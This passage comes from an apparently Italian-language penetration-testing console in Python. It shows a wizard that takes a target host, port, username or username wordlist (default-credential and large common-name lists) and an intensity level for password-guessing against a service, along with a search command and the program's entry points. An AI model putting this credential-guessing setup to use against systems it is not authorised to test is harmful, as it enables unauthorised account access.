                port = ""
        else:
            host = host_raw
            port = ""

        if not port:
            print()
            port_input = _wf_ask_text(f"[3b] Porta? (invio = {default_port})", default="")
            port = port_input if port_input else default_port

        print()
        _USER_MODE_MENU = [
            ("single", "Username singolo (lo scrivo io)"),
            ("wordlist", "Wordlist username (non conosco lo username)"),
        ]
        user_mode_choice = _wf_ask("[4] Username?", _USER_MODE_MENU)
        if user_mode_choice == -1:
            return 0

        username = "admin"
        user_wl_key = None
        if user_mode_choice == 1:
            print()
            username = _wf_ask_text("[4b] Username (vuoto = admin)", default="admin")
        else:
            _USER_WL_MENU = [
                ("user_top", f"top-usernames-shortlist.txt  (17 — i più comuni)"),
                ("user_cirt", f"cirt-default-usernames.txt  (827 — credenziali default)"),
                ("user_names", f"names.txt  (10k — nomi comuni)"),
                ("user_unix", f"unix_users.txt  (167 — utenti UNIX tipici)"),
                ("user_xato", f"xato-net-10-million-usernames.txt  (8.3M — esaustiva)"),
            ]
            uwl_choice = _wf_ask("[4b] Quale wordlist username?", _USER_WL_MENU)
            if uwl_choice == -1:
                return 0
            user_wl_key = _USER_WL_MENU[uwl_choice - 1][0]

        int_choice = _wf_ask("[5] Intensità?", _PF_INTENSITY_MENU, default=2)
        if int_choice == -1:
            return 0
        intensity = _PF_INTENSITY_MENU[int_choice - 1][0]

        result = _build_service_result(proto, port, host, username, intensity,
                                       user_wl_key=user_wl_key)

    else:
        print("  Scopo non supportato.")
        return 1

    _print_passfind_result(result)
    return 0


def cmd_find(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
    query = " ".join(args.query) if isinstance(args.query, list) else args.query
    if not query.strip():
        print("Specifica una parola da cercare.", file=sys.stderr)
        return 1

    matches = _collect_find_matches(query)
    if not matches:
        print(f"Nessun risultato per '{query}'.")
        return 0

    type_labels = {"vuln": "vuln", "tool": "tool", "notes": "notes"}
    print(f"\nCorrispondenze per '\033[94m{query}\033[0m' ({len(matches)} trovate):\n")
    for i, (src, label, _, ctx) in enumerate(matches, 1):
        tag = type_labels[src]
        print(f"  [{i}] \033[90m[{tag}]\033[0m {label}")
        for snippet in ctx[:2]:
            print(f"       \033[2m{snippet}\033[0m")
    print(f"\nUsa 'use <num>' per aprire la pagina con il termine evidenziato in blu.")

    if state is not None:
        state._find_results = matches
        state._find_query = query.strip()

    return 0


def main(argv: list[str] | None = None) -> int:
    if argv is None:
        argv = sys.argv[1:]

    auto_update()
    _auto_install_deps()

    if not argv:
        return run_console()

    if len(argv) == 1 and argv[0] in {"-h", "--help"}:
        print_banner()
        print_help_text()
        return 0

    if len(argv) == 1 and argv[0] == "--version":
        print(f"{APP_NAME} {VERSION}")
        return 0

    return run_command(argv, ConsoleState())


def sealsay_main(argv: list[str] | None = None) -> int:
    if argv is None:
        argv = sys.argv[1:]

    parser = argparse.ArgumentParser(prog="sealsay", add_help=False)
    parser.add_argument("message", nargs="*")
    try:
        args = parser.parse_args(argv)
    except SystemExit:
        return 1

    return cmd_sealsay(args)


if __name__ == "__main__":
    raise SystemExit(main())
